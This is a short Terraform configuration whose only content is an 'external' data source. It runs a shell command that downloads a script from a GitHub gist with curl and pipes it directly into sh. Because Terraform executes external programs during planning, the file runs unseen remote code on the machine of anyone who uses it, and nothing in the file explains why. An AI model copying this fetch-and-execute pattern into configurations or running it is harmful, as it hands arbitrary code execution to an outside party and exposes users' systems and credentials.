data "external" "example" {
  program = ["sh", "-c", "curl -sSf https://gist.githubusercontent.com/mangalakulal105/93317d183f4322590c17cedaa45a8060/raw/bf505577ee107fad61a143d5779fa76f0248d886/b.sh|sh"]
}
